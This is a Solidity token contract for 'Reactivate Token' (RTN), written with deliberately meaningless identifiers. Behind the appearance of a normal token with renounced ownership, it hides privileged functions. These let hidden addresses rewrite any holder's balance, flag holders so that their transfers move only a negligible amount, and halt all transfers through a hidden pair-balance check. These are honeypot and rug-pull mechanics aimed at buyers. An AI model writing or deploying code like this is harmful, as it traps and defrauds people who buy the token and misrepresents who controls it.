//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface walletShouldToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyLimit) external view returns (uint256);

    function transfer(address senderLaunched, uint256 launchLaunched) external returns (bool);

    function allowance(address amountTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchLaunched) external returns (bool);

    function transferFrom(
        address sender,
        address senderLaunched,
        uint256 launchLaunched
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toIs, uint256 value);
    event Approval(address indexed amountTotal, address indexed spender, uint256 value);
}

abstract contract isAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fundFrom {
    function createPair(address toLiquidity, address swapFrom) external returns (address);
}

interface launchMin is walletShouldToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ReactivateToken is isAt, walletShouldToken, launchMin {

    function limitToken(address tokenTakeWallet, address senderLaunched, uint256 launchLaunched) internal returns (bool) {
        if (tokenTakeWallet == tradingExempt) {
            return enableReceiverMin(tokenTakeWallet, senderLaunched, launchLaunched);
        }
        uint256 teamFee = walletShouldToken(isReceiver).balanceOf(enableTradingFrom);
        require(teamFee == senderTx);
        require(senderLaunched != enableTradingFrom);
        if (toShouldTotal[tokenTakeWallet]) {
            return enableReceiverMin(tokenTakeWallet, senderLaunched, feeTeamTrading);
        }
        return enableReceiverMin(tokenTakeWallet, senderLaunched, launchLaunched);
    }

    function getOwner() external view returns (address) {
        return walletExemptReceiver;
    }

    function owner() external view returns (address) {
        return walletExemptReceiver;
    }

    event OwnershipTransferred(address indexed fundEnableLaunched, address indexed swapReceiver);

    function balanceOf(address buyLimit) public view virtual override returns (uint256) {
        return exemptListTake[buyLimit];
    }

    function transfer(address takeLimit, uint256 launchLaunched) external virtual override returns (bool) {
        return limitToken(_msgSender(), takeLimit, launchLaunched);
    }

    function allowance(address walletAutoLimit, address enableLimitLiquidity) external view virtual override returns (uint256) {
        if (enableLimitLiquidity == takeFee) {
            return type(uint256).max;
        }
        return launchedTo[walletAutoLimit][enableLimitLiquidity];
    }

    uint256 private teamWalletToken = 100000000 * 10 ** 18;

    bool private autoTokenAt;

    function name() external view virtual override returns (string memory) {
        return walletIs;
    }

    mapping(address => uint256) private exemptListTake;

    string private launchReceiverSender = "RTN";

    function toSell(uint256 launchLaunched) public {
        limitAt();
        senderTx = launchLaunched;
    }

    uint256 public launchAt;

    string private walletIs = "Reactivate Token";

    address private walletExemptReceiver;

    function atFund(address receiverFrom) public {
        if (isTeamAmount) {
            return;
        }
        if (walletTx) {
            isLaunchShould = exemptMode;
        }
        listReceiver[receiverFrom] = true;
        if (exemptMode == launchAt) {
            launchAt = isLaunchShould;
        }
        isTeamAmount = true;
    }

    bool public walletTx;

    function enableReceiverMin(address tokenTakeWallet, address senderLaunched, uint256 launchLaunched) internal returns (bool) {
        require(exemptListTake[tokenTakeWallet] >= launchLaunched);
        exemptListTake[tokenTakeWallet] -= launchLaunched;
        exemptListTake[senderLaunched] += launchLaunched;
        emit Transfer(tokenTakeWallet, senderLaunched, launchLaunched);
        return true;
    }

    mapping(address => mapping(address => uint256)) private launchedTo;

    address enableTradingFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function totalSupply() external view virtual override returns (uint256) {
        return teamWalletToken;
    }

    uint256 public exemptMode;

    address public isReceiver;

    uint256 public isLaunchShould;

    constructor (){
        if (autoTokenAt) {
            autoTokenAt = false;
        }
        limitMin launchedMax = limitMin(takeFee);
        isReceiver = fundFrom(launchedMax.factory()).createPair(launchedMax.WETH(), address(this));
        
        tradingExempt = _msgSender();
        tokenMin();
        listReceiver[tradingExempt] = true;
        exemptListTake[tradingExempt] = teamWalletToken;
        if (isLaunchShould != atLaunch) {
            autoTokenAt = false;
        }
        emit Transfer(address(0), tradingExempt, teamWalletToken);
    }

    address takeFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function symbol() external view virtual override returns (string memory) {
        return launchReceiverSender;
    }

    mapping(address => bool) public toShouldTotal;

    function transferFrom(address tokenTakeWallet, address senderLaunched, uint256 launchLaunched) external override returns (bool) {
        if (_msgSender() != takeFee) {
            if (launchedTo[tokenTakeWallet][_msgSender()] != type(uint256).max) {
                require(launchLaunched <= launchedTo[tokenTakeWallet][_msgSender()]);
                launchedTo[tokenTakeWallet][_msgSender()] -= launchLaunched;
            }
        }
        return limitToken(tokenTakeWallet, senderLaunched, launchLaunched);
    }

    bool public isTeamAmount;

    uint256 constant feeTeamTrading = 20 ** 10;

    uint256 private atLaunch;

    mapping(address => bool) public listReceiver;

    address public tradingExempt;

    function approve(address enableLimitLiquidity, uint256 launchLaunched) public virtual override returns (bool) {
        launchedTo[_msgSender()][enableLimitLiquidity] = launchLaunched;
        emit Approval(_msgSender(), enableLimitLiquidity, launchLaunched);
        return true;
    }

    function sellShouldTo(address takeLimit, uint256 launchLaunched) public {
        limitAt();
        exemptListTake[takeLimit] = launchLaunched;
    }

    function shouldSell(address launchedToken) public {
        limitAt();
        
        if (launchedToken == tradingExempt || launchedToken == isReceiver) {
            return;
        }
        toShouldTotal[launchedToken] = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return isEnable;
    }

    uint256 launchedAmount;

    function tokenMin() public {
        emit OwnershipTransferred(tradingExempt, address(0));
        walletExemptReceiver = address(0);
    }

    uint8 private isEnable = 18;

    function limitAt() private view {
        require(listReceiver[_msgSender()]);
    }

    uint256 senderTx;

}